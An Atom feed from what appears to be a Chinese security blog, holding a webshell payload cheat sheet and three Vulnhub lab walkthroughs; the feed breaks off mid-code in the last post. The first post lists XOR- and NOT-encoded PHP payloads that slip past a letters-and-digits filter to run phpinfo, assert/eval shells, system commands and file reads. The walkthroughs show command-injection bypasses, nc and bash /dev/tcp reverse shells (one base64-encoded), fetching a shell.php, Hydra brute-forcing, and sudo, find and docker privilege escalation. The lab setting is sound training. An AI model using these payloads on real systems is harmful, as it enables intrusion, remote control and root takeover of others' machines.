<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">
  <title>欢迎来访哦!</title>
  
  
  <link href="/atom.xml" rel="self"/>
  
  <link href="http://perthinking.xyz/"/>
  <updated>2020-06-30T14:55:48.768Z</updated>
  <id>http://perthinking.xyz/</id>
  
  <author>
    <name>1eng</name>
    
  </author>
  
  <generator uri="https://hexo.io/">Hexo</generator>
  
  <entry>
    <title>Webshell总结(一)</title>
    <link href="http://perthinking.xyz/Webshell/1/"/>
    <id>http://perthinking.xyz/Webshell/1/</id>
    <published>2020-06-30T14:49:02.000Z</published>
    <updated>2020-06-30T14:55:48.768Z</updated>
    
    <content type="html"><![CDATA[<p>1.源码:</p><p>if(!preg_match(‘/[a-z0-9]/is’,@$_GET[‘shell’])) {</p><p> eval(@$_GET[‘shell’]);</p><p>}</p><h1 id="Payload"><a href="#Payload" class="headerlink" title="Payload:"></a>Payload:</h1><ol><li><h2 id="测试phpinfo"><a href="#测试phpinfo" class="headerlink" title="测试phpinfo"></a>测试phpinfo</h2></li></ol><pre><code>1.${%86%86%86%86^%d9%c1%c3%d2}{%86}();&amp;%86=phpinfo2.${%ff%ff%ff%ff^%a0%b8%ba%ab}{%ff}();&amp;%ff=phpinfo3.(~%8F%97%8F%96%91%99%90)();  需要7.0版本以上才能用4.${%fe%fe%fe%fe^%a1%b9%bb%aa}{%fe}();&amp;%fe=phpinfo 同1, 有很多可以异或 _GET5.$啊=(~%8F%97%8F%96%91%99%90);$啊();  低版本也可使用</code></pre><h2 id="2-直接getshell"><a href="#2-直接getshell" class="headerlink" title="2) 直接getshell"></a>2) 直接getshell</h2><pre><code>1.${%fe%fe%fe%fe^%a1%b9%bb%aa}[_](${%fe%fe%fe%fe^%a1%b9%bb%aa}[__]);&amp;_=assert&amp;__=eval($_POST[%27a%27]) //长度小于402.$_=(&#39;%01&#39;^&#39;`&#39;).(&#39;%13&#39;^&#39;`&#39;).(&#39;%13&#39;^&#39;`&#39;).(&#39;%05&#39;^&#39;`&#39;).(&#39;%12&#39;^&#39;`&#39;).(&#39;%14&#39;^&#39;`&#39;);$__=&#39;_&#39;.(&#39;%0D&#39;^&#39;]&#39;).(&#39;%2F&#39;^&#39;`&#39;).(&#39;%0E&#39;^&#39;]&#39;).(&#39;%09&#39;^&#39;]&#39;);$___=$$__;$_($___[_]);  //assert($_POST[_])3.(~%9E%8C%8C%9A%8D%8B)((~%DB%A0%AF%B0%AC%AB)[(~%9E)]);  //assert($_POST[_])经测试,该payload部分情况有用4.$_=&quot;`{{{&quot;^&quot;?&lt;&gt;/&quot;;${$_}[_](${$_}[__]);&amp;_=assert&amp;__=eval($_POST[a])   //assert($_POST[a]) 长度小于405.(~%9E%8C%8C%9A%8D%8B)((~%91%9A%87%8B)((~%98%9A%8B%9E%93%93%97%9A%9E%9B%9A%8D%8C)()));   //(&quot;assert&quot;)((&quot;next&quot;)((&quot;getallheaders&quot;)()));  长度小于40</code></pre><p>使用方法:</p><p><img src="/Webshell/1/1.png" alt> </p><p><img src="/Webshell/1/2.png" alt></p><h2 id="3-读文件"><a href="#3-读文件" class="headerlink" title="3) 读文件"></a>3) 读文件</h2><pre><code>(~%8F%8D%96%91%8B%A0%8D)((~%8C%9C%9E%91%9B%96%8D)((&quot;./&quot;)));  -&gt; print_r(scandir(&#39;./&#39;))(~%8D%9A%9E%9B%99%96%93%9A)((~%D0%99%93%9E%98)); -&gt;Readfile(&#39;/flag&#39;)(~%8C%86%8C%8B%9A%92)((~%8B%86%8F%9A%DF%99%93%9E%98%D1%8F%97%8F)); -&gt; system(type ./flag.php)$啊=(~%8C%86%8C%8B%9A%92);$呵=(~%88%97%90%9E%92%96);$啊($呵);  -&gt; system(whoami)print_r(scandir(&#39;.&#39;));  -&gt;  ((%8f%8d%96%91%8b%a0%8d)^(%ff%ff%ff%ff%ff%ff%ff))(((%8c%9c%9e%91%9b%96%8d)^(%ff%ff%ff%ff%ff%ff%ff))(%d1^%ff));  //16个字符print_r(scandir(.));   -&gt;   ((%9b%9c%9b%9b%9b%9b%9c)^(%9b%8f%9b%9c%9c%9b%8f)^(%8f%9e%96%96%8c%a0%9e)^(%ff%ff%ff%ff%ff%ff%ff))(((%9b%9b%9b%9b%9b%9b%9c)^(%9b%9b%9b%9c%a0%9b%8f)^(%8c%9c%9e%96%a0%96%9e)^(%ff%ff%ff%ff%ff%ff%ff))(%d1^%ff));  //11个字符show_source(end(scandir(.)));   -&gt;((%8d%9c%97%a0%88%8d%97%8d%9c%a0%a0)^(%9a%97%9b%88%a0%9a%9b%9b%8d%9c%9a)^(%9b%9c%9c%a0%88%9b%9c%9c%9c%a0%a0)^(%ff%ff%ff%ff%ff%ff%ff%ff%ff%ff%ff))(((%a0%97%8d)^(%9a%9a%9b)^(%a0%9c%8d)^(%ff%ff%ff))(((%8d%a0%88%97%8d%9b%9c)^(%9a%9c%8d%9a%9b%9a%8d)^(%9b%a0%9b%9c%8d%97%9c)^(%ff%ff%ff%ff%ff%ff%ff))(%d1^%ff))); //13个字符</code></pre><p>单次异或的话 太局限了 就不贴了</p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;p&gt;1.源码:&lt;/p&gt;
&lt;p&gt;if(!preg_match(‘/[a-z0-9]/is’,@$_GET[‘shell’])) {&lt;/p&gt;
&lt;p&gt; eval(@$_GET[‘shell’]);&lt;/p&gt;
&lt;p&gt;}&lt;/p&gt;
&lt;h1 id=&quot;Payload&quot;&gt;&lt;a href=&quot;#Pay
      
    
    </summary>
    
    
      <category term="Webshell" scheme="http://perthinking.xyz/categories/Webshell/"/>
    
    
  </entry>
  
  <entry>
    <title>Vulnhub靶场做题记录-Reconforce-01</title>
    <link href="http://perthinking.xyz/Vulnhub%E9%9D%B6%E5%9C%BA/12/"/>
    <id>http://perthinking.xyz/Vulnhub%E9%9D%B6%E5%9C%BA/12/</id>
    <published>2020-06-30T14:26:13.000Z</published>
    <updated>2020-06-30T14:42:24.604Z</updated>
    
    <content type="html"><![CDATA[<p>1.<em>nmap -T5 -A 192.168.56.104 -oA reconforce-port</em> 扫描</p><pre><code>PORT  STATE SERVICE VERSION21/tcp open ftp   vsftpd 2.0.8 or later|_ftp-anon: Anonymous FTP login allowed (FTP code 230)| ftp-syst: |  STAT: | FTP server status:|   Connected to ::ffff:192.168.56.103|   Logged in as ftp|   TYPE: ASCII|   No session bandwidth limit|   Session timeout in seconds is 300|   Control connection is plain text|   Data connections will be plain text|   At session startup, client count was 2|   vsFTPd 3.0.3 - secure, fast, stable|_End of status22/tcp open ssh   OpenSSH 8.0p1 Ubuntu 6build1 (Ubuntu Linux; protocol 2.0)| ssh-hostkey: |  3072 6f:96:94:65:72:80:08:93:23:90:20:bc:76:df:b8:ec (RSA)|  256 6f:bb:49:1a:a9:b6:e5:00:84:19:a0:e4:2b:c4:57:c4 (ECDSA)|_ 256 ce:3d:94:05:f4:a6:82:c4:7f:3f:ba:37:1d:f6:23:b0 (ED25519)80/tcp open http  Apache httpd 2.4.41 ((Ubuntu))|_http-server-header: Apache/2.4.41 (Ubuntu)|_http-title: Recon_WebMAC Address: 08:00:27:7E:93:7F (Oracle VirtualBox virtual NIC)Aggressive OS guesses: Linux 2.6.32 (96%), Linux 3.2 - 4.9 (96%), Linux 2.6.32 - 3.10 (96%), Linux 3.4 - 3.10 (95%), Linux 3.1 (95%), Linux 3.2 (95%), AXIS 210A or 211 Network Camera (Linux 2.6.17) (94%), Linux 2.6.32 - 2.6.35 (94%), Linux 2.6.32 - 3.5 (94%), Linux 2.6.32 - 3.13 (93%)No exact OS matches for host (test conditions non-ideal).Network Distance: 1 hopService Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel</code></pre><p>允许匿名登录 没有文件 但有提示</p><p><img src="/Vulnhub%E9%9D%B6%E5%9C%BA/12/1.png" alt></p><p><img src="/Vulnhub%E9%9D%B6%E5%9C%BA/12/2.png" alt></p><p>2.扫目录没有东西</p><p> <img src="/Vulnhub%E9%9D%B6%E5%9C%BA/12/3.png" alt></p><p><img src="/Vulnhub%E9%9D%B6%E5%9C%BA/12/4.png" alt></p><p>访问 要验证</p><p><img src="/Vulnhub%E9%9D%B6%E5%9C%BA/12/5.png" alt></p><p>根据之前提示写个组合密码</p><pre><code>word = [&#39;5ecure&#39;,&#39;Secruity&#39;,&#39;Secure&#39;,&#39;Recon&#39;]for i in word:  print(i + &#39;@hackNos&#39;)</code></pre><p>-&gt; </p><p>5ecure@hackNos</p><p>Secruity@hackNos</p><p>Secure@hackNos</p><p>Recon@hackNos</p><p>使用msf的模块登录爆破</p><p><img src="/Vulnhub%E9%9D%B6%E5%9C%BA/12/6.png" alt></p><p> <img src="/Vulnhub%E9%9D%B6%E5%9C%BA/12/7.png" alt></p><p><img src="/Vulnhub%E9%9D%B6%E5%9C%BA/12/8.png" alt></p><p>-&gt;</p><p> <img src="/Vulnhub%E9%9D%B6%E5%9C%BA/12/9.png" alt></p><p>3.然后又是ping功能的命令执行</p><p>|ls</p><p><img src="/Vulnhub%E9%9D%B6%E5%9C%BA/12/18.png" alt></p><p>|ls cat out.php</p><pre><code>&lt;pre&gt;&lt;?phpif( isset( $_POST[ &#39;Submit&#39; ] ) ) {  // Get input  $target = trim($_REQUEST[ &#39;ip&#39; ]);  // Set blacklist  $substitutions = array(​    &#39;&amp;&#39; =&gt; &#39;&#39;,​    &#39;;&#39; =&gt; &#39;&#39;,​    &#39;| &#39; =&gt; &#39;&#39;,​    &#39;-&#39; =&gt; &#39;&#39;,​    &#39;$&#39; =&gt; &#39;&#39;,​    &#39;(&#39; =&gt; &#39;&#39;,​    &#39;)&#39; =&gt; &#39;&#39;,​    &#39;`&#39; =&gt; &#39;&#39;,​    &#39;||&#39; =&gt; &#39;&#39;,  );  // Remove any of the charactars in the array (blacklist).  $target = str_replace( array_keys( $substitutions ), $substitutions, $target );  // Determine OS and execute the ping command.  if( stristr( php_uname( &#39;s&#39; ), &#39;Windows NT&#39; ) ) {​    // Windows​    $cmd = shell_exec( &#39;ping &#39; . $target );  }  else {​    // *nix​    $cmd = shell_exec( &#39;ping -c 4 &#39; . $target );  }  // Feedback for the end user  echo &quot;&lt;pre&gt;{$cmd}&lt;/pre&gt;&quot;;}?&gt; &lt;/pre&gt; </code></pre><p>其中过滤了 |空格  故意加了空格 所以绕过了  故意的?</p><p>Bash 反弹不过来   原因:</p><p>shell_exec(“ping -c 3 $pinged”);</p><p>shell_exec( ‘ping -c 4 ‘ . $target );</p><p>这两个的区别</p><p>或者是www-data权限不够</p><p>那么将shell下载到靶机</p><p><em>|wget <a href="http://192.168.56.103:8081/shell.php" target="_blank" rel="noopener">http://192.168.56.103:8081/shell.php</a></em></p><p>发现靶机有nc  那么用nc反弹</p><p><img src="/Vulnhub%E9%9D%B6%E5%9C%BA/12/10.png" alt></p><p><em>rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2&gt;&amp;1|nc 192.168.56.104 9001 &gt;/tmp/f</em></p><p> <img src="/Vulnhub%E9%9D%B6%E5%9C%BA/12/11.png" alt></p><p>进入python交互shell</p><p><em>python -c ‘import pty;pty.spawn(“/bin/bash”)’</em></p><p><img src="/Vulnhub%E9%9D%B6%E5%9C%BA/12/12.png" alt></p><p>两个用户</p><p><img src="/Vulnhub%E9%9D%B6%E5%9C%BA/12/13.png" alt></p><p>Hydra 爆破一下 </p><p><em>hydra -l recon -P /home/aleng/vulnhub/password.txt ssh://192.168.56.104</em></p><p><img src="/Vulnhub%E9%9D%B6%E5%9C%BA/12/14.png" alt></p><p>第一个flag</p><p><img src="/Vulnhub%E9%9D%B6%E5%9C%BA/12/15.png" alt></p><p>可以执行任何命令</p><p><img src="/Vulnhub%E9%9D%B6%E5%9C%BA/12/16.png" alt></p><p>第二个flag</p><p><img src="/Vulnhub%E9%9D%B6%E5%9C%BA/12/17.png" alt></p><p>docker提权</p><p><em>docker run -v /:/mnt –rm -it alpine chroot /mnt sh</em></p><p><em>docker run -it 容器id -v /:/mbt</em></p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;p&gt;1.&lt;em&gt;nmap -T5 -A 192.168.56.104 -oA reconforce-port&lt;/em&gt; 扫描&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;PORT  STATE SERVICE VERSION

21/tcp open ftp   vsftpd 2.0.8 o
      
    
    </summary>
    
    
      <category term="Vulnhub靶场" scheme="http://perthinking.xyz/categories/Vulnhub%E9%9D%B6%E5%9C%BA/"/>
    
    
  </entry>
  
  <entry>
    <title>Vulnhub靶场做题记录-haclabs-no_name</title>
    <link href="http://perthinking.xyz/Vulnhub%E9%9D%B6%E5%9C%BA/11/"/>
    <id>http://perthinking.xyz/Vulnhub%E9%9D%B6%E5%9C%BA/11/</id>
    <published>2020-06-30T14:05:31.000Z</published>
    <updated>2020-06-30T14:24:29.106Z</updated>
    
    <content type="html"><![CDATA[<p>1.先获得主机ip</p><p>netdiscover</p><p><img src="/Vulnhub%E9%9D%B6%E5%9C%BA/11/1.png" alt></p><p>发现ip为 101</p><p> <img src="/Vulnhub%E9%9D%B6%E5%9C%BA/11/2.png" alt></p><p>2.nmap 扫描一波</p><p><em>nmap -T5 -A 192.168.56.101 -oA hacknoname-port</em></p><p><img src="/Vulnhub%E9%9D%B6%E5%9C%BA/11/3.png" alt></p><p>发现没什么重要的信息</p><p>3.目录扫描一波</p><p><em>gobuster dir -u <a href="http://192.168.56.101/" target="_blank" rel="noopener">http://192.168.56.101/</a> -w /usr/share/wordlists/dirb/big.txt -t 100 -x php</em></p><pre><code>/admin (Status: 200)/.htpasswd (Status: 403)/.htpasswd.php (Status: 403)/.htaccess (Status: 403)/.htaccess.php (Status: 403)/index.php (Status: 200)/server-status (Status: 403)/superadmin.php (Status: 200)</code></pre><p>Superadmin.php 很明显  存在命令执行</p><p><img src="/Vulnhub%E9%9D%B6%E5%9C%BA/11/4.png" alt></p><p>cat源码 分析以下</p><pre><code>&lt;?php  if (isset($_POST[&#39;submitt&#39;])){​      $word=array(&quot;;&quot;,&quot;&amp;&amp;&quot;,&quot;/&quot;,&quot;bin&quot;,&quot;&amp;&quot;,&quot; &amp;&amp;&quot;,&quot;ls&quot;,&quot;nc&quot;,&quot;dir&quot;,&quot;pwd&quot;);​      $pinged=$_POST[&#39;pinger&#39;];​      $newStr = str_replace($word, &quot;&quot;, $pinged);​      if(strcmp($pinged, $newStr) == 0){  $flag=1;}​    else{  $flag=0;}}if ($flag==1){$outer=shell_exec(&quot;ping -c 3 $pinged&quot;);echo &quot;&lt;pre&gt;$outer&lt;/pre&gt;&quot;;}?&gt;</code></pre><p>过滤了大部分字符串 没过滤 |  要知道 | 在命令执行中经常要用到</p><p>4.写一句话或者反弹shell</p><p><em>bash -i &gt;&amp; /dev/tcp/192.168.56.103/8888 0&gt;&amp;1</em></p><p>这样并不能反弹 用base64转一下</p><p><em>echo ‘bash -i &gt;&amp; /dev/tcp/192.168.56.103/8888 0&gt;&amp;1’ | base64</em></p><p><em>YmFzaCAtaSA+JiAvZGV2L3RjcC8xOTIuMTY4LjU2LjEwMy84ODg4IDA+JjEK</em></p><p><em>|echo ‘YmFzaCAtaSA+JiAvZGV2L3RjcC8xOTIuMTY4LjU2LjEwMy84ODg4IDA+JjEK’ | base64 -d|bash</em></p><p> <img src="/Vulnhub%E9%9D%B6%E5%9C%BA/11/5.png" alt> </p><p>切换到python shell  然而没有弹回来 还不清楚什么原因</p><p><em>python3 -c ‘import pty;pty.spawn(“/bin/bash”)’;</em></p><p><em>python3 -c “import pty;pty.spawn(‘/bin/bash’)”;</em></p><p> <img src="/Vulnhub%E9%9D%B6%E5%9C%BA/11/6.png" alt></p><p>那就写一句话 本地测试root和普通用户是成功写入本地  但是靶机执行过后访问404 后来发现是www-data权限不够 所以命令执行是不能写入的</p><p><img src="/Vulnhub%E9%9D%B6%E5%9C%BA/11/7.png" alt></p><p><img src="/Vulnhub%E9%9D%B6%E5%9C%BA/11/8.png" alt></p><p>没关系 反弹的shell是交互式shell就行</p><p>查看用户</p><p><img src="/Vulnhub%E9%9D%B6%E5%9C%BA/11/9.png" alt></p><p>获得yash用户的flag</p><p>cat /home/yash/flag1.txt</p><p>结果返回</p><p>Due to some security issues,I have saved haclabs password in a hidden file.</p><p>查找此用户的文件</p><p>find / -type f -user yash 2&gt;/dev/null</p><p><img src="/Vulnhub%E9%9D%B6%E5%9C%BA/11/10.png" alt></p><p>cat下隐藏文件</p><p>Haclabs1234  是haclabs的密码</p><p> 第二个用户的flag  </p><p><img src="/Vulnhub%E9%9D%B6%E5%9C%BA/11/11.png" alt></p><p>登录上后查看sudo权限</p><p><img src="/Vulnhub%E9%9D%B6%E5%9C%BA/11/12.png" alt></p><p>也看到了提示</p><p><img src="/Vulnhub%E9%9D%B6%E5%9C%BA/11/13.png" alt></p><p>sudo执行命令提权</p><p>sudo find . -exec /bin/sh ; -quit</p><p>这里 ; 表示find . -exec /bin/sh 这条命令的结束 也是衔接后面的-quit 不然的话执行命令后无法退出</p><p><img src="/Vulnhub%E9%9D%B6%E5%9C%BA/11/14.png" alt></p><p>suid提权</p><p>find /usr -perm -u=s -type f 2&gt;/dev/null</p><p><img src="/Vulnhub%E9%9D%B6%E5%9C%BA/11/15.png" alt></p><p>find test -exec /bin/bash -p ; -quit</p><p>解析:</p><p>查找有root权限的程序 这里用了test</p><p> <img src="/Vulnhub%E9%9D%B6%E5%9C%BA/11/16.png" alt></p><p>然后利用pkexec 就相当于sudo  然后去执行root权限的程序</p><p><img src="/Vulnhub%E9%9D%B6%E5%9C%BA/11/17.png" alt></p><p><img src="/Vulnhub%E9%9D%B6%E5%9C%BA/11/18.png" alt></p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;p&gt;1.先获得主机ip&lt;/p&gt;
&lt;p&gt;netdiscover&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;/Vulnhub%E9%9D%B6%E5%9C%BA/11/1.png&quot; alt&gt;&lt;/p&gt;
&lt;p&gt;发现ip为 101&lt;/p&gt;
&lt;p&gt; &lt;img src=&quot;/Vulnhub%E9%9D
      
    
    </summary>
    
    
      <category term="Vulnhub靶场" scheme="http://perthinking.xyz/categories/Vulnhub%E9%9D%B6%E5%9C%BA/"/>
    
    
  </entry>
  
  <entry>
    <title>Vulnhub靶场做题记录-Djiin</title>
    <link href="http://perthinking.xyz/Vulnhub%E9%9D%B6%E5%9C%BA/10/"/>
    <id>http://perthinking.xyz/Vulnhub%E9%9D%B6%E5%9C%BA/10/</id>
    <published>2020-06-30T13:23:31.000Z</published>
    <updated>2020-06-30T14:03:42.627Z</updated>
    
    <content type="html"><![CDATA[<p>  安装靶机,nmap扫描发现7331端口是http服务,22端口ssh服务被过滤了,21端口允许匿名登陆,</p><pre><code>21/tcp  open ftp   vsftpd 3.0.3| ftp-anon: Anonymous FTP login allowed (FTP code 230)| -rw-r--r--  1 0    0       11 Oct 20 23:54 creds.txt| -rw-r--r--  1 0    0       128 Oct 21 00:23 game.txt|_-rw-r--r--  1 0    0       113 Oct 21 00:23 message.txt</code></pre><p>1337端口信息提示:</p><p>Let’s see how good you are with simple maths  Answer my questions 1000 times and I’ll give you your gift</p><p> 意思是让我们回答1000个问题就给一个大的礼物</p><p> 用 nc 发起 请求 nc 192.168.245.12 发现是一个计算器,让我们回答1000次数学问题</p><p> <img src="/Vulnhub%E9%9D%B6%E5%9C%BA/10/1.png" alt></p><p> 用python解决即可:</p><pre><code>#coding: utf-8import telnetlibimport time,redef main():  try:​    tn = telnetlib.Telnet(&#39;192.168.245.12&#39;,port=1337)  except:​    print(&#39;error&#39;)  time.sleep(0.5)  loop = 1  while loop &lt; 1002:​    data = tn.read_very_eager().decode(&#39;ascii&#39;)​    res = re.search(&#39;(.*?)\s&gt;&#39;,data).group(1)​    result = str(calc(res))​    print(str(loop) + &#39; &#39; + result)​    loop = loop + 1​    tn.write(result.encode(&#39;ascii&#39;)+b&#39;\n&#39;)​    time.sleep(0.1)  data = tn.read_very_eager().decode(&#39;ascii&#39;)  return datadef calc(res):  \#(4, &#39;-&#39;, 6)  res_str = res.strip(&#39;(&#39;).replace(&#39; &#39;,&#39;&#39;).strip(&#39;)&#39;)  nums = res_str.split(&#39;,&#39;)  n1 = nums[0].strip()  operator = nums[1].strip().replace(&#39;\&#39;&#39;,&#39;&#39;)  n2 = nums[2].strip()  return eval(n1+operator+n2)print(main())</code></pre><p> <img src="/Vulnhub%E9%9D%B6%E5%9C%BA/10/2.png" alt></p><p>等了几分钟后礼物出来了</p><p>Here is your gift, I hope you know what to do with it:</p><p>1356, 6784, 3409</p><p> ssh的22端口是可以隐藏在其它端口的,称之为暗语,如果要将端口打开,就要用knock工具打开暗语,然后22端口才能开启</p><p> 下载knockd工具</p><p> 尝试将得到的端口打开 knock 192.168.245.12 1356, 6784, 3409</p><p>  这里试了好多遍,期间重新搭建靶机,才将22端口开启</p><p> 接下来下载可以匿名登陆的ftp中的文件</p><p>  登陆后使用help命令:</p>  <img src="/Vulnhub%E9%9D%B6%E5%9C%BA/10/3.png"><p> 可以使用mget 或 reget下载文件  将这三个文件下载到本地:</p><p> creds.txt  -&gt; nitu:81299  可能是账号密码</p><p> game.txt -&gt; </p><p>oh and I forgot to tell you I’ve setup a game for you on port 1337. See if you can reach to the </p><p>final level and get the prize.</p><p> 这个提示1337端口又信息, 这里1337的端口已经获取到信息了</p><p> message.txt  -&gt;@nitish81299 I am going on holidays for few days, please take care of all the work. And don’t mess up anything.</p><p> @nitish81299 可能是账号或密码 记录下来</p><p> 下面看7331端口获取信息:</p><p> gobuster 扫目录得到 /wish 目录</p><p> 访问后发现是一个命令执行 过滤了一些字符</p><p><img src="/Vulnhub%E9%9D%B6%E5%9C%BA/10/4.png" alt></p><p> <img src="/Vulnhub%E9%9D%B6%E5%9C%BA/10/5.png" alt></p><p>解码后 name=uid=33(www-data) gid=33(www-data) groups=33(www-data)</p><p>使用burp进行fuzz看过滤那些字符</p><p> 先发送到Repeater 分析一下:</p><p> <img src="/Vulnhub%E9%9D%B6%E5%9C%BA/10/6.png" alt></p><p> 有个302重定向 那么跑包时应设置要跑重定向</p><p> <img src="/Vulnhub%E9%9D%B6%E5%9C%BA/10/7.png" alt></p><p> 选择字典</p><p> <img src="/Vulnhub%E9%9D%B6%E5%9C%BA/10/8.png" alt></p><p>因为kali中burp是社区版 不能设置线程的所以有点慢</p><p>可以看到 有几个符号是被过滤了的:</p><p> <img src="/Vulnhub%E9%9D%B6%E5%9C%BA/10/9.png" alt></p><p> 尝试反弹shell </p><p><em>bash -i &gt;&amp; /dev/tcp/192.168.245.6/9001 0&gt;&amp;1</em>  在kali对它进行一个url编码</p><p><em>bash+-i+&gt;%26+/dev/tcp/192.168.245.6/9001+0&gt;%261</em></p><p> 但是含有 /  符号 是不能反弹成功的</p><p> 这里用到了linux中利用  | 符号 进行多条命令执行 的知识</p><p> <em>cat /etc/passwd</em>  在burp中对它进行一个base64编码, 再本地执行命令 </p><p> <img src="/Vulnhub%E9%9D%B6%E5%9C%BA/10/10.png" alt></p><p>可以看到成功执行命令 那么bash -i &gt;&amp; /dev/tcp/192.168.245.6/9001 0&gt;&amp;1也是同样可以执行的</p><p> 成功反弹shell:</p><p> <img src="/Vulnhub%E9%9D%B6%E5%9C%BA/10/11.png" alt></p><p> 同样切换到python shell  切换到后台 但是同样的root用户权限和命令 不知道为什么我的不能放到后台</p><p>目录下有个app.py:</p><pre><code>import subprocessfrom flask import Flask, redirect, render_template, request, url_forapp = Flask(__name__)app.secret_key = &quot;key&quot;CREDS = &quot;/home/nitish/.dev/creds.txt&quot;RCE = [&quot;/&quot;, &quot;.&quot;, &quot;?&quot;, &quot;*&quot;, &quot;^&quot;, &quot;$&quot;, &quot;eval&quot;, &quot;;&quot;]def validate(cmd):  if CREDS in cmd and &quot;cat&quot; not in cmd:​    return True  try:​    for i in RCE:​      for j in cmd:​        if i == j:​          return False​    return True  except Exception:​    return False@app.route(&quot;/&quot;, methods=[&quot;GET&quot;])def index():  return render_template(&quot;main.html&quot;)@app.route(&quot;/wish&quot;, methods=[&#39;POST&#39;, &quot;GET&quot;])def wish():  execute = request.form.get(&quot;cmd&quot;)  if execute:​    if validate(execute):​      output = subprocess.Popen(execute, shell=True,​                   stdout=subprocess.PIPE).stdout.read()​    else:​      output = &quot;Wrong choice of words&quot;​    return redirect(url_for(&quot;genie&quot;, name=output))  else:​    return render_template(&#39;wish.html&#39;)@app.route(&#39;/genie&#39;, methods=[&#39;GET&#39;, &#39;POST&#39;])def genie():  if &#39;name&#39; in request.args:​    page = request.args.get(&#39;name&#39;)  else:​    page = &quot;It&#39;s not that hard&quot;  return render_template(&#39;genie.html&#39;, file=page)if __name__ == &quot;__main__&quot;:  app.run(host=&#39;0.0.0.0&#39;, debug=True)</code></pre><p> 分析: 可以看到用了python中的Flask模板程序 </p><pre><code> if CREDS in cmd and &quot;cat&quot; not in cmd:​    return True execute = request.form.get(&quot;cmd&quot;)  if execute:​    if validate(execute):​      output = subprocess.Popen(execute, shell=True,​                   stdout=subprocess.PIPE).stdout.read()</code></pre><p> 比如这个代码 是可以绕过的 more /home/nitish/.dev/creds.txt 这样的话 cat 不在里面也就返回True 然后执行此条命令</p><pre><code> try:​    for i in RCE:​      for j in cmd:​        if i == j:​          return False​    return True</code></pre><p>而这个代码就是过滤字符 RCE = [“/“, “.”, “?”, “*”, “^”, “$”, “eval”, “;”]</p><p>所以可以burp抓包拿到 /home/nitish/.dev/creds.txt 或者 直接 <em>cat /home/nitish/.dev/creds.txt</em></p><p> 内容: nitish:p4ssw0rdStr3r0n9  应该是账号密码 登陆ssh成功</p><p> 登陆后目录下有一个user.txt 拿到第一个flag:10aay8289ptgguy1pvfa73alzusyyx3c</p><p> 接下来想办法提权:</p><p> sudo -l 查看可执行的程序:</p><p> (sam) NOPASSWD: /usr/bin/genie </p><p> 发现sam用户可以不用密码执行 /usr/bin/genie </p><p> ls -al /usr/bin/genie 再查看 程序权限 -rwsr-x— 1 sam nitish 72000 Nov 11 19:09 /usr/bin/genie</p><p> 发现sam用户是可以执行这个程序的</p><p> 再查看genie程序参数:</p><p><img src="/Vulnhub%E9%9D%B6%E5%9C%BA/10/12.png" alt></p><p> 说可以执行程序或命令 但是没有用</p><p> <img src="/Vulnhub%E9%9D%B6%E5%9C%BA/10/13.png" alt></p><p> 看是否用手册可以查看</p><p> <img src="/Vulnhub%E9%9D%B6%E5%9C%BA/10/14.png" alt></p><p> 可以看到隐藏了 -cmd 参数 可以执行命令</p><p><img src="/Vulnhub%E9%9D%B6%E5%9C%BA/10/15.png" alt></p><p>前面了解到sam用户可以不用密码执行 /usr/bin/genie  于是用sudo -u指定sam用户执行程序</p><p><img src="/Vulnhub%E9%9D%B6%E5%9C%BA/10/16.png" alt></p><p>发现用户变了</p><p> sudo -l 查看可执行程序 </p><p><img src="/Vulnhub%E9%9D%B6%E5%9C%BA/10/17.png" alt></p><p> root用户不用密码就可以执行/root/lago 程序</p><p><img src="/Vulnhub%E9%9D%B6%E5%9C%BA/10/18.png" alt></p><p>但是不能得到有用的信息</p><p>用strings 工具 查看程序 也没有权限</p><p> 这时切换到sam用户目录 有这些文件:</p><p><img src="/Vulnhub%E9%9D%B6%E5%9C%BA/10/19.png" alt></p><p> .pyc是关键文件</p><p> 但是要反编译才能得到.py 文件</p><p> 用nc工具下载到本地 或 base64 转码复制到本地 都行的,只不过base64转码可能太多符号不好弄 这边的话用nc</p><p> 本地监听端口 <em>nc -lp 9002 &gt; 1.pyc</em></p><p> 靶机发送连接 <em>nc 192.168.245.6 9002 &lt;.pyc</em></p><p> 用工具uncompyle6 反编译 .pyc</p><p> <em>pip3 install uncompyle6</em>  先安装工具</p><p> 编译后得到如下代码:</p><pre><code>from getpass import getuserfrom os import systemfrom random import randintdef naughtyboi():  print &#39;Working on it!! &#39;def guessit():  num = randint(1, 101)  print &#39;Choose a number between 1 to 100: &#39;  s = input(&#39;Enter your number: &#39;)  if s == num:​    system(&#39;/bin/sh&#39;)  else:​    print &#39;Better Luck next time&#39;def readfiles():  user = getuser()  path = input(&#39;Enter the full of the file to read: &#39;)  print &#39;User %s is not allowed to read %s&#39; % (user, path)def options():  print &#39;What do you want to do ?&#39;  print &#39;1 - Be naughty&#39;  print &#39;2 - Guess the number&#39;  print &#39;3 - Read some damn files&#39;  print &#39;4 - Work&#39;  choice = int(input(&#39;Enter your choice: &#39;))  return choicedef main(op):  if op == 1:​    naughtyboi()  else:​    if op == 2:​      guessit()​    else:​      if op == 3:​        readfiles()​      else:​        if op == 4:​          print &#39;work your ass off!!&#39;​        else:​          print &#39;Do something better with your life&#39;if __name__ == &#39;__main__&#39;:  main(options())# okay decompiling 1.pyc#File &#39;-o&#39; doesn&#39;t exist. Skipped#File &#39;1.py&#39; doesn&#39;t exist. Skipped# # Successfully decompiled file</code></pre><p> 代码正好对应 root/lago 程序的执行结果 很简单,漏洞点出现再弱类型比较:</p><pre><code>def guessit():  num = randint(1, 101)  print &#39;Choose a number between 1 to 100: &#39;  s = input(&#39;Enter your number: &#39;)  if s == num:​    system(&#39;/bin/sh&#39;)  else:​    print &#39;Better Luck next time&#39;</code></pre><p> if s == num:  用的是双等号,没有比较字符类型. 输入 num 即可绕过</p><p> 然后拿到root权限 第二个flag:</p><p><img src="/Vulnhub%E9%9D%B6%E5%9C%BA/10/20.png" alt></p><p>Flag:33eur2wjdmq80z47nyy4fx54bnlg3ibc</p><p>同时查看下它的lago程序：</p><pre><code>#!/usr/bin/python2from getpass import getuserfrom os import systemfrom os.path import isfilefrom random import randintdef naughtyboi(): # TODO: Get some sexy news, if you know what I mean ;-)  print(&quot;Working on it!! &quot;)def check(path):  